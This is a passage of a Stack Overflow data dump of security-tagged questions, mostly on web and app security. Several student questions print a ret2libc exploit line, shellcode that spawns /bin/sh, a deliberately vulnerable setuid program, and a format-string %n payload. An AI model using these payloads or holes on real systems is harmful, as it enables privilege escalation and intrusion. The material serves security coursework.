<code>0xbffff9b9</code></li>\n<li><code>system()</code> is @ <code>0xb7ed0000</code></li>\n<li><code>exit()</code> is @ <code>0xb7ec60f0</code></li>\n</ol>\n\n<h2>Exploit</h2>\n\n<p>I exploit it by piping in <code>72</code> zeros, exit, system and the pointer to <code>/bin/zsh</code>, in that order:</p>\n\n<pre><code>printf \"%072x\\xf0\\x60\\xec\\xb7\\x00\\x00\\xed\\xb7\\xb9\\xf9\\xff\\xbf\" | ./vuln\n</code></pre>\n\n<p>The program doesn't segfault or execute <code>/bin/zsh</code>.</p>\n\n<h2>In GDB</h2>\n\n<p>Interestingly, if I change <code>SHELL=\"/xin/zsh\"</code>, and execute it in gdb, the system call works:</p>\n\n<pre><code>Cannot exec /xin/zsh\n</code></pre>\n\n<p>So my questions are:</p>\n\n<ol>\n<li><p>Have I understood the return to libc attack concept correctly?</p></li>\n<li><p>Am I piping the malicious code in the correct way and order?</p></li>\n<li><p>Why does it appear to work in GDB, but not in the shell? <br>\n(I've already read <a href=\"http://stackoverflow.com/questions/4177996/return-to-libc-works-in-gdb-but-not-when-running-alone\">return to libc works in gdb but not when running alone</a>)</p></li>\n</ol>\n"},{"tags":["php","security","function","include"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12684070,"title":"Central PHP functions file without printing code on front end","body":"<p>I'm working on building a very large, very complex website and have PHP functions all over the place. Many of them are reused, and it's a very inefficient way of doing things, I know.</p>\n\n<p>I would like to use a central functions.php file, similar to how WordPress utilizes a central functions.php file. The fast &amp; easy solution would be to simply include the file using PHP include. However, the goal is to place the code behind the veil, making the PHP functions inaccessible to view on the front end. So a PHP include (the only solution I've found anywhere, which frightens me), will not work.</p>\n\n<p>In WordPress, when I call a function defined in the central functions.php file, it works, but the functions are not printed in the code on the front end of the site, as they are when I use a simple PHP include.</p>\n\n<p>How can I accomplish this? Can't seem to find a straightforward answer anywhere. Thanks in advance for any direction on this issue.</p>\n"},{"tags":["php","ajax","json","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12680663,"title":"Ajax post request security","body":"<p>I am developing a mobile application using PhoneGap which will communicate with a server(PHP) via ajax requests.</p>\n\n<p>On the server side(PHP)\nSomething like <a href=\"https://example.com/retrieveData.php\" rel=\"nofollow\">https://example.com/retrieveData.php</a>\nwill get the user id via <code>$_POST['user_id']</code> and return some sensitive information about the user as JSON.</p>\n\n<p>And on the client side(PhoneGap-Javascript) \nthat JSON output will be parsed and will be used in the application.</p>\n\n<p>My concern is that if someone steals this url ( <a href=\"https://example.com/retrieveData.php\" rel=\"nofollow\">https://example.com/retrieveData.php</a> ), he can manually send fake post requests and can steal the returned user information?</p>\n\n<p>How can I secure this communication?</p>\n"},{"tags":["security","varnish"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12680408,"title":"Varnish Security","body":"<p>Varnish security <strong>main.vcl</strong> contains</p>\n\n<pre><code># clear all internal variables\ninclude \"/etc/varnish/security/build/variables.vcl\";\n</code></pre>\n\n<p>and </p>\n\n<pre><code># fallthrough: clear all internal variables on security.vcl_recv exit\ninclude \"/etc/varnish/security/build/variables.vcl\";\n</code></pre>\n\n<p>but <strong>/etc/varnish/security/build/variables.vcl</strong> is not included into the git. \nI commented it out, and it is working fine but where can I get <strong>/etc/varnish/security/build/variables.vcl</strong>? <br />\nThanks!</p>\n"},{"tags":["php","security","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12555761,"title":"session_regenerate_id(): Session object destruction failed, when running site via security scanners?","body":"<p>Is this normal, as I have tried two different scanners and they both seem to produce the same errors, so I'm assuming maybe it has to do with the way scanners work - as I don't get these errors when viewing the site normally (the site also functions fine - as expected).</p>\n\n<p>Ofcourse, I could just ignore it and clear the error log (when I've finished scanning my site), but I'm just curious and would like to know why (and if there is a 'fix')?</p>\n\n<p>FYI:</p>\n\n<ul>\n<li><p>When the site is being scanned; I get the same error repeatedly (on pages where <code>session_regenerate_id(true)</code> is included).</p></li>\n<li><p>The scanners which I have tried are both free Firefox Add-ons; 'SQL Inject Me' (by Security Compass) and Websecurify.</p></li>\n<li><p>I'm running these tests on my site (via 'localhost').</p></li>\n<li><p>The sessions are file based.</p></li>\n</ul>\n"},{"tags":["c","security","buffer-overflow"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":2,"view_count":1227,"score":4,"question_id":4733169,"title":"Exploit a backup program using C","body":"<p>I'm doing an assignment of a security course that asks me to find 4 vulnerabilities of a backup program (setuid) and use each of them to gain root access (on a virtual linux machine with old version of gcc etc.).\nThere should be one of buffer overflow and one of format string. </p>\n\n<p>Could anyone help me to point out where the 4 vulnerabilities are?\nI think the buffer overflow can happened in <code>copyFile()</code>.</p>\n\n<p>The following is the code for backup.c: (which can be invoked in \"backup backup foo\" or \"backup restore foo\")</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n\n#define CMD_BACKUP 0\n#define CMD_RESTORE 1\n\n#define BACKUP_DIRECTORY \"/usr/share/backup\"\n#define FORBIDDEN_DIRECTORY \"/etc\"\n\nstatic\nint copyFile(char* src, char* dst)\n{\n  char buffer[3072]; /* 3K ought to be enough for anyone*/\n  unsigned int i, len;\n  FILE *source, *dest;\n  int c;\n\n  source = fopen(src, \"r\");\n  if (source == NULL) {\n    fprintf(stderr, \"Failed to open source file\\n\");\n    return -1;\n  }\n\n  i = 0;\n  c = fgetc(source);\n  while (c != EOF) {\n    buffer[i]  = (unsigned char) c;\n    c = fgetc(source);\n    i++;\n  }\n\n  len = i;\n  fclose(source);\n\n  dest = fopen(dst, \"w\");\n  if (dest == NULL) {\n    fprintf(stderr, \"Failed to open destination file\\n\");\n    return -1;\n  }\n\n  for(i = 0; i &lt; len; i++) \n    fputc(buffer[i], dest);\n\n  fclose(dest);\n\n  return 0;\n}\n\nstatic\nint restorePermissions(char* target)\n{\n  pid_t pid;\n  int status;\n  char *user, *userid, *ptr;\n  FILE *file;\n  char buffer[64];\n  mode_t mode;\n\n  // execute \"chown\" to assign file ownership to user\n  pid = fork();\n\n  // error\n  if (pid &lt; 0) {\n    fprintf(stderr, \"Fork failed\\n\");\n    return -1;\n  }\n\n  // parent\n  if (pid &gt; 0) {\n    waitpid(pid, &amp;status, 0);\n    if (WIFEXITED(status) == 0 || WEXITSTATUS(status) &lt; 0)\n      return -1;\n  }\n  else {\n\n    // child\n    // retrieve username\n    user = getenv(\"USER\");\n    // retrieve corresponding userid   \n    file = fopen(\"/etc/passwd\", \"r\");\n    if (file == NULL) {\n      fprintf(stderr, \"Failed to open password file\\n\");\n      return -1;\n    }\n    userid = NULL;\n    while (!feof(file)) {\n      if (fgets(buffer, sizeof(buffer), file) != NULL) {\n    ptr = strtok(buffer, \":\");\n    if (strcmp(ptr, user) == 0) {\n      strtok(NULL, \":\"); // password\n      userid = strtok(NULL, \":\"); // userid\n      ptr = strtok(NULL, \":\"); // group\n      *ptr = '\\0';\n      break;\n    }\n      }\n    }\n\n    if (userid != NULL) \n      execlp(\"/bin/chown\", \"/bin/chown\", userid, target, NULL);\n\n    // reached only in case of error\n    return -1;\n  }  \n\n  mode = S_IRUSR | S_IWUSR | S_IEXEC;\n  chmod(target, mode);\n\n  return 0;\n}\n\nstatic\nvoid usage(char* parameter) \n{\n  char newline = '\\n';\n  char output[96];\n  char buffer[96];\n\n  snprintf(buffer, sizeof(buffer),\n        \"Usage: %.60s backup|restore pathname%c\", parameter, newline);\n\n  sprintf(output, buffer);\n  printf(output);\n}\n\nint main(int argc, char* argv[]) \n{\n  int cmd;\n  char *path, *ptr;\n  char *forbidden = FORBIDDEN_DIRECTORY;\n  char *src, *dst, *buffer;\n  struct stat buf;\n\n  if (argc != 3) {\n    usage(argv[0]);\n    return 1;\n  }\n\n  if (strcmp(\"backup\", argv[1]) == 0) {\n    cmd = CMD_BACKUP;\n  }\n  else if (strcmp(\"restore\", argv[1]) == 0) {\n    cmd = CMD_RESTORE;\n  } else {\n    usage(argv[0]);\n    return 1;\n  }\n\n  path = argv[2];\n\n  // prevent access to forbidden directory\n  ptr = realpath(path, NULL);\n  if (ptr != NULL &amp;&amp; strstr(ptr, forbidden) == ptr) {\n    fprintf(stderr, \"Not allowed to access target/source %s\\n\", path);\n    return 1;\n  }\n\n  // set up paths for copy operation\n  buffer = malloc(strlen(BACKUP_DIRECTORY) + 1 + strlen(path) + 1);\n  if (buffer == NULL) {\n    fprintf(stderr, \"Failed to allocate memory\\n\");\n    return 1;\n  }\n\n  if (cmd == CMD_BACKUP) {\n    src = path;\n\n    dst = buffer;\n    strcpy(dst, BACKUP_DIRECTORY);\n    strcat(dst, \"/\");\n    strcat(dst, path);\n  }\n  else {\n    src = buffer;\n    strcpy(src, BACKUP_DIRECTORY);\n    strcat(src, \"/\");\n    strcat(src, path);\n\n    dst = path;\n\n    // don't overwrite existing file if we don't own it\n    if (stat(dst, &amp;buf) == 0 &amp;&amp; buf.st_uid != getuid()) {\n      fprintf(stderr, \"Not your file: %s\\n\", dst);\n      return 1;\n    }\n  }\n\n  // perform actual backup/restore operation\n  if (copyFile(src, dst) &lt; 0)\n    return 1;\n\n  // grant user access to restored file\n  if (cmd == CMD_RESTORE) {\n    if (restorePermissions(path) &lt; 0)\n      return 1;\n  }\n\n  return 0;\n}\n</code></pre>\n\n<p>And something useful:</p>\n\n<pre><code>  // one way to invoke backup\n  //system(\"/usr/local/bin/backup backup foo\");\n\n  // another way\n  args[0] = TARGET; args[1] = \"backup\"; \n  args[2] = \"foo\"; args[3] = NULL;\n\n  env[0] = NULL;\n  if (execve(TARGET, args, env) &lt; 0)\n    fprintf(stderr, \"execve failed.\\n\");\n  exit(0);\n</code></pre>\n"},{"tags":["security",".htaccess","authentication",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":3936788,"title":"htaccess & htpasswd not hooking up correctly","body":"<p>Every time I try to go to <a href=\"http://www.public.asu.edu/~rlpeck/CSE465a/art.htm\" rel=\"nofollow\">Art School</a> on  <a href=\"http://www.public.asu.edu/~rlpeck/\" rel=\"nofollow\">Home Page</a> and put it the correct username/password I get a server error. Yes this is homework, and yes it is my first time doing anything related to this type of setup so any help would be appreciated. All the various instructions that I found listed this as the correct way so I'm sort of stuck.</p>\n\n<p>.htpasswd file(<code>/afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd</code>):</p>\n\n<pre><code>Alice:$apr1$sgDEa/..$FBtlSGHkbPHmlW80Sj2Sx1\nBob:$apr1$V8LLa/..$iX.YVKHoDfKyTKEMvuX.g/\nChris:$apr1$XuHOa/..$o6bf/JyA1otkH0jor4n5c/\nDave:$apr1$hpjQa/..$u3/D.f0xdN23Flg35qp9g.\nEve:$apr1$JIGSa/..$uTs55qYH1.gtDV7WZ0X7q0\n</code></pre>\n\n<p>.htaccess file(<code>/afs/asu.edu/users/r/l/p/rlpeck/www/CSE465a</code>):</p>\n\n<pre><code>AuthType Basic\nAuthName \"Restricted Area\"\nAuthUserFile /afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd\nAuthGroupFile /dev/null\nRequire valid-user\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/ooIf2.pngBlockquote\" alt=\"Server Error\"></p>\n\n<p>When I do run  <code>locate -r error.log</code> all I get are these:</p>\n\n<pre><code>/opt/tivoli/tsm/client/ba/bin/dsmerror.log\n/usr/share/doc/cups-1.2.4/de/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/es/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/help/ref-error_log.html\n/usr/share/doc/cups-1.2.4/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/ja/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/pl/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/sv/images/button-view-error-log.gif\n/var/log/cups/error_log\n/var/log/cups/error_log.1\n/var/log/cups/error_log.2\n</code></pre>\n\n<p>Edit: Response from help desk:</p>\n\n<blockquote>\n  <p>If you were testing the security of your page, you passed. I dont see an error</p>\n</blockquote>\n"},{"tags":["c","security","ip","packet-sniffers","packet-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":102,"score":1,"question_id":2407616,"title":"Inject a packet to terminate a TCP connection","body":"<p>I have to write a program that sniffs network packets (part1-the simple part).<br>\nAnd I have to update the program (part2) so that it will be able to terminate connections.<br>\nThe specific requirements are:</p>\n\n<blockquote>\n  <p>Construct raw packets by specifying data link layer and network layer information including appropriate source and destination MAC and IP addresses. These packets are intended to terminate the connection. To do so, you should used SOCK_RAW as the  socket type to be able to set the header information by yourself.  </p>\n</blockquote>\n\n<p>Can anybody give me some ideas on the second part?<br>\nShould I hijack the session, apply a DoS attack on one of the users?</p>\n\n<p>All I need is some tips of how to terminate the connection.\nI am using the C programming language, and this is a course assignment for the security course.</p>\n"},{"tags":["c","security","buffer-overflow"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":107,"score":2,"question_id":10540094,"title":"Testing buffer overflow","body":"<p>I've been given a C code file where given the right input a buffer overflow occurs and then root access is granted. This is a Fedora bug using ZShell. In order to test this (security subject) we disabled the random memory address assignment that is enabled in the Linux kernel.</p>\n\n<p>I'm asked to test different inputs until a segmention fault happens, where the input is  the buffer size. What I don't get is, why should I test with different values? I'm not sure the code will help but I just dont get the point of varying the input.</p>\n\n<pre><code>/* vulnerable.c */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nunsigned char buf[] =\n\"\\x31\\xc0\" /* xorl %eax,%eax */\n\"\\x50\" /* pushl %eax */\n\"\\x68\"\"//sh\" /* pushl $0x68732f2f */\n\"\\x68\"\"/bin\" /* pushl $0x6e69622f */\n\"\\x89\\xe3\" /* movl %esp,%ebx */\n\"\\x50\" /* pushl %eax */\n\"\\x53\" /* pushl %ebx */\n\"\\x89\\xe1\" /* movl %esp,%ecx */\n\"\\x99\" /* cdql */\n\"\\xb0\\x0b\" /* movb $0x0b,%al */\n\"\\xcd\\x80\" /* int $0x80 */\n;\n/* -------------------------------------------------- */\nvoid vuln(char * buf)\n{\n    char a[16] = { 0 };\n    strcpy(a, buf);\n}\nint main(int argc, char * argv[])\n{\n    int *ret;\n    if (argc != 2)\n    {\n        printf(\"Usage: %s &lt;input&gt;\\n\", argv[0]);\n        exit(1);\n    }\n    vuln(argv[1]);\n    printf(\"%p\\n\", buf);\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","security","malloc"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":9162299,"title":"I'm trying to find the security holes in this C code for a queue","body":"<p>I know that there's something fishy about the <code>malloc</code> part, but I'm having trouble seeing what's unsafe about this:</p>\n\n<pre><code>//que structure\ntypedef struct queue{\n         int *que;  // the actual array of queue elements\n         int head;   // the head index in que of the queue\n         int count;  /// number of elements in queue\n         int size; // max number of elements in queue\n    } QUEUE;\n\n\nvoid qManage(QUEUE **qptr, int flag, int size){\n      if(flag){\n              /* allocate a new queue */\n              *qptr = malloc(sizeof(QUEUE));\n              (*qptr)-&gt;head = (*qptr)-&gt;count = 0;\n              (*qptr)-&gt;que = malloc(size * sizeof(int));\n              (*qptr)-&gt;size = size;\n    }\n    else{\n             /* delete the current queue */\n             (void) free((*qptr)-&gt;que);\n             (void) free(*qptr);\n    }\n}\n</code></pre>\n"},{"tags":["c","string","security","printf","format-string"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":250,"score":1,"question_id":7073151,"title":"Format String Attack in C","body":"<p>I'm studying a security unit and I'm attempting to understand format string attacks. Could somebody please attempt to explain this to me?</p>\n\n<p>The following code is taken from: <a href=\"http://julianor.tripod.com/bc/tn-usfs.pdf\" rel=\"nofollow\">http://julianor.tripod.com/bc/tn-usfs.pdf</a>:</p>\n\n<pre><code>/*\n * fmtme.c\n *       Format a value into a fixed-size buffer\n */\n#include &lt;stdio.h&gt;\nint\nmain(int argc, char **argv)\n{\n    char buf[100];\n    int x;\n    if(argc != 2)\n        exit(1);\n    x = 1;\n    snprintf(buf, sizeof buf, argv[1]);\n    buf[sizeof buf - 1] = 0;\n    printf(\"buffer (%d): %s\\n\", strlen(buf), buf);\n    printf(\"x is %d/%#x (@ %p)\\n\", x, x, &amp;x);\n    return 0;\n}\n</code></pre>\n\n<p>As I understand it, the <code>%n</code> format specifier is used to read a specified address back into memory, then when <code>printf</code> pops values off the stack, it should read our address. I can't seem to pull this off. </p>\n\n<p>In the document, the following example is provided:</p>\n\n<pre><code>perl -e 'system \"./fmtme\", \"\\x58\\x74\\x04\\x08%d%n\"'\n</code></pre>\n\n<p>Where did <code>\\x58\\x74\\x04\\x08%d%n</code> come from?</p>\n"},{"tags":["security","cryptography","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":5494120,"title":"What kind of cryptographic mechanism uses repeated xor's?","body":"<p>I'm attempting to analyze a short encryption program and figure out which mechanism it's using.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main( int argc, char * argv[] ) {\n    long int key;\n    char * endptr;\n\n    key = strtol( argv[1], &amp;endptr, 10 );\n\n    srandom( key );\n    { /* now copy input to output through crypt transformation */\n            char ch;\n            while (!feof( stdin )) {\n                    putc( (getc(stdin) ^ random())&amp;0xFF, stdout );\n            }\n            fclose( stdout );\n    }\n}\n</code></pre>\n\n<p>I can follow this simply, but I'm having trouble trying to weed out which mechanism it's using..</p>\n\n<p>I'm looking at the following:</p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Public-key_cryptography\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Public-key_cryptography</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Block_cipher\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Block_cipher</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Stream_cipher\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Stream_cipher</a></p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Diffie-Hellman\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Diffie-Hellman</a></p>\n\n<p>I'm leaning towards iterated block cyphers but I really have no idea at this point.</p>\n"},{"tags":["security","overflow","buffer"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":239,"score":0,"question_id":1973534,"title":"buffer overflow","body":"<p>How can a buffer overflow effect the OSI model? </p>\n\n<p>How many layers of the OSI model can be affected by an buffer overflow vulnerability.</p>\n"},{"tags":["linux","security","debugging","memory-management"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":1569633,"title":"Information about RAM management in OS Linux, protection programs","body":"<p>I'm writing a report and presentation for my college titled \"Protection runtime program in RAM. Examples of work with the protected program.\" I'm using Linux. </p>\n\n<p>I divided my report into two parts:</p>\n\n<ol>\n<li><p>Description of technology managed RAM OS Linux - Allocated memory for applications - Protection stack for one application from other applications.</p></li>\n<li><p>Protection runtime program from disassembler and debugger.</p></li>\n</ol>\n\n<p>What websites, article, books about this subjects do you recommend? </p>\n"},{"tags":["java","ftp","sftp","security"],"answer_count":12,"favorite_count":47,"up_vote_count":72,"down_vote_count":0,"view_count":74095,"score":72,"question_id":14617,"title":"Java: What is the best way to SFTP a file from a server","body":"<p>What is the best way to retrieve a file from a server using SFTP (as opposed to FTPS) using Java?\nI'll leave the particular definition of best up to you but in my mind it should include free :)</p>\n"},{"tags":["security","jsf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12672465,"title":"JSF (Container Managed Security) Group Roles","body":"<p>For a JSF application running on JBoss 4.2 with JSF 1.2, Container Managed Security and EJB 3.0 I'm looking for a solution to have several roles combined in one role. For example:</p>\n\n<ul>\n<li>Roles: IT-Support, Phone-Support, Technical-Support, Deliver-Support</li>\n</ul>\n\n<p>Now, I want to specify one role which includes for example three of these roles:</p>\n\n<ul>\n<li>Role: Senior-Suppoert (IT-Support, Technical-Support, Deliver-Support)</li>\n</ul>\n\n<p>Is this possible with the container managed security and Jboss?</p>\n"},{"tags":["linux","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12471861,"title":"Checking if linux running in normal mode","body":"<p>How can I check in my application that the system is running in normal mode, not booted with a bootable media, like CD-ROM or USB. What files, services, or any other thing need to be overlooked?</p>\n\n<p>This is really needed, as I need to achieve some level of security along with other measures and techniques that I use to secure my application. Any ideas?</p>\n\n<p>P.S. I use Ubuntu 12.4</p>\n"},{"tags":["javascript","security","cryptography","w3c"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12588249,"title":"WebcryptoAPI - secure or not?","body":"<p>This is about the new W3 WebcryptoAPI draft standard - <a href=\"http://www.w3.org/2012/webcrypto/WebCryptoAPI/\" rel=\"nofollow\">http://www.w3.org/2012/webcrypto/WebCryptoAPI/</a></p>\n\n<p>Here is a post by one of it's authors</p>\n\n<p><a href=\"https://plus.google.com/u/0/105761279104103278252/posts/CSwVZ1RUijo\" rel=\"nofollow\">https://plus.google.com/u/0/105761279104103278252/posts/CSwVZ1RUijo</a></p>\n\n<p>It says its in part trying to change the \"Javascript Cryptography Considered Hamrful\" problem. However if you look at the \"Javascript Cryptography Considered Hamrful\" article -  <a href=\"http://www.matasano.com/articles/javascript-cryptography/\" rel=\"nofollow\">http://www.matasano.com/articles/javascript-cryptography/</a> - it seems as if most of the problems still remain unsolved. The only problem solved is that you won't have hand coded cryptographic functions in javascript - these will be provided by the browser. However, the remaining problems still remain.</p>\n\n<p>Your thoughts?</p>\n"},{"tags":["security","osx","keychain"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1287,"score":4,"question_id":1186385,"title":"Getting Attributes of Keychain Items","body":"<p>I'm trying to get the attributes of a keychain item. This code should look up all the available attributes, then print off their tags and contents.</p>\n\n<p>According to <a href=\"http://developer.apple.com/documentation/security/Reference/keychainservices/Reference/reference.html#//apple%5Fref/c/tdef/SecItemAttr\" rel=\"nofollow\">the docs</a> I should be seeing tags like 'cdat', but instead they just look like an index (i.e., the first tag is 0, next is 1). This makes it pretty useless since I can't tell which attribute is the one I'm looking for.</p>\n\n<pre><code>\tSecItemClass itemClass;\n\tSecKeychainItemCopyAttributesAndData(itemRef, NULL, &amp;itemClass, NULL, NULL, NULL);\n\n\tSecKeychainRef keychainRef;\n\tSecKeychainItemCopyKeychain(itemRef, &amp;keychainRef);\n\n\tSecKeychainAttributeInfo *attrInfo;\n\tSecKeychainAttributeInfoForItemID(keychainRef, itemClass, &amp;attrInfo);\n\n\tSecKeychainAttributeList *attributes;\n\tSecKeychainItemCopyAttributesAndData(itemRef, attrInfo, NULL, &amp;attributes, 0, NULL);\n\n\tfor (int i = 0; i &lt; attributes-&gt;count; i ++)\n\t{\n\t\tSecKeychainAttribute attr = attributes-&gt;attr[i];\n\t\tNSLog(@\"%08x %@\", attr.tag, [NSData dataWithBytes:attr.data length:attr.length]);\n\t}\n\n\tSecKeychainFreeAttributeInfo(attrInfo);\n\tSecKeychainItemFreeAttributesAndData(attributes, NULL);\n\tCFRelease(itemRef);\n\tCFRelease(keychainRef);\n</code></pre>\n"},{"tags":["java","security","cookies","login"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12676106,"title":"Java web application secured authorization via cookies","body":"<p>I have a java servlet web application. In the application I have two authorization logics: \n1. Authorization via username and password - standart login via web form with username and password which user fills up.\n2. Authorization via cookies. Once, user fills up username and password, and checks a checkbox 'remember me', after this he shouldn't enters username/password. \nI have a question about option number two (cookies). At the moment logic is: I check if user checked 'remember me', I get his username and password hash, and store it to the cookies. (Two cookies: <strong>username</strong>, <strong>password</strong>) But, I think that the way is not secured. Because somebody can steal the cookies and get access to the web app. \nQuestion is: what is the best secured way to authorized user via cookies? What should I store in the cookeis?</p>\n"},{"tags":["security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":12675899,"title":"How to use OVAL to find CVEs","body":"<p>I need a way of finding CVEs for specific platforms (and not just necessarily desktop OS platforms). Been checking out the CVE and NVD websites, saw something called OVAL. Any good?</p>\n\n<p>The idea is a user sets his operating system / software, along with its version number on my site, and I check against a vulnerability database to see if his current OS or software is vulnerable to attacks.\nDoes anyone have any experience in this?</p>\n"},{"tags":["javascript","security","internet-explorer","permission-denied"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12673666,"title":"Permission Denied Error in IE While changing URL using Javascript","body":"<p>I am opening a popup window from main(parent) window and passing main windows cookie for session.</p>\n\n<p>Both window are different sites and I use cookie to share some information. That is main window from site www.site1.com and opening popup window of www.site-two.com.</p>\n\n<p>However if i logged out main (parent) window and cleared session cookie, then i refresh popup window in IE says, permission denied.</p>\n\n<p>But works fine in Firefox, Chrome.</p>\n\n<p>In site-two.com, popup.html </p>\n\n<pre><code>&lt;script src=\"www.site1.com/JS/logoff.js\" /&gt;\n</code></pre>\n\n<p>In Site1.com's logoff.js</p>\n\n<pre><code>function ClosePopup(){\n\n self.opener.location = self.location.href; // Error permission denied\n</code></pre>\n\n<p>}</p>\n\n<p>All the properties of <strong>self.opener</strong> are all saying 'Access Denied'</p>\n\n<p>What could be the reason? Any help are appreciated !!</p>\n"},{"tags":["iphone","ios","security","rsa"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2120,"score":2,"question_id":5942712,"title":"iOS - Creating SecKeyRef from exponent+modulus","body":"<p>I would like to decrypt a RSA-encoded blob on iPhone, by having an exponent and modulus as private key. In Java (with javax.crypto), this could be easily achieved by code like this:</p>\n\n<pre><code>// 1) key\nRSAPublicKeySpec keySpec = new RSAPublicKeySpec(myModulus, myPublicExponent);\nKeyFactory fact = KeyFactory.getInstance(\"RSA\");\nKey pubKey = fact.generatePublic(keySpec);\n\n// 2) cypher\nCipher cipher = Cipher.getInstance(\"RSA/ECB/PKCS1Padding\");\ncipher.init(Cipher.DECRYPT_MODE, keySpec);\n\n// 3) use cypher to decode my block to an output stream\n</code></pre>\n\n<p>But with the iPhone security API I can't create a SecKeyRef (key) other than by generating a pair or importing a certificate, which I don't have/want.</p>\n\n<p>Is there a way to create a key manually having a modulus + exponent? If so, can you give me a clue on how?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["javascript","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12669692,"title":"Javascript: Un-able to create new hidden input element","body":"<p>I was following the code found in <a href=\"http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL\" rel=\"nofollow\">here</a> to create a secure login page. The trouble is, it can't create the hidden input element.</p>\n\n<pre><code>function formhash(form, password) {\n    // Create a new element input, this will be out hashed password field.\n    var p = document.createElement(\"input\");\n    // Add the new element to our form.\n    form.appendChild(p);\n    p.name = \"p\";\n    p.type = \"hidden\"\n    p.value = hex_sha512(password.value);\n    // Make sure the plaintext password doesn't get sent.\n    password.value = \"\";\n    // Finally submit the form.\n    form.submit();\n}\n</code></pre>\n\n<p>I have read through saying that it only works for IE and not for gecko. Is this true or I just missing something?</p>\n\n<p>Update:</p>\n\n<p>The formhash function works when I place the javascript into the login page. When it is move to an external file, the problem starts again. </p>\n\n<p>@asprin Noted. The reason I place php is because the code was based on php implementation</p>\n\n<p>@Henrik Will do that. Thanks</p>\n\n<p>@RenePot Yup, it was called on the process_login.php page</p>\n\n<p>@MarkGarcia Thanks for the suggestion. Notice it say's that the function wasn't declare</p>\n\n<p>@WernerVesterås Not sure but I think after. </p>\n\n<p>@Quentin Thanks for the suggestion. Will do that :D </p>\n"},{"tags":["security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12666437,"title":"Where can I access a word list of normal vocabulary level English words?","body":"<p>Not sure if this is really a programming question, but I am asking a resource relevant to programming...</p>\n\n<p>I have a password generator hosted from <a href=\"http://JonathansCorner.com/passwords/\" rel=\"nofollow\">http://JonathansCorner.com/passwords/</a>, whose premise is the only general way I know that generates passwords that are both strong and user-friendly: string together dictionary words with nonword characters.</p>\n\n<p>The dictionary it originally used was the Cracklib word list, which contains any number of obscure, recherch&eacute; terms, which is appropriate in a Cracklib password checking dictionary, but frustratingly opaque to a user (\"I'm supposed to remember 'Menkar' as a word???\"). I tried to make the words just a little less recherch&eacute; by cutting the dictionary to words six characters or less, and this was definitely an improvement in more than one way, but the vocabulary still remains stubbornly obscure; I'm just asking people to remember obscure 5-6 letter words instead of obscure 10-12 letter words.</p>\n\n<p>I know that Basic English would provide one extreme option (possibly at the expense of real password strength), but I wanted to ask if there was a dictionary available at about an eighth grade reading level so a reasonably literate user would see only familiar words in most passwords, but I was wondering if there was any programming resource available that would provide more or less a fairly complete vocabulary of fairly familiar 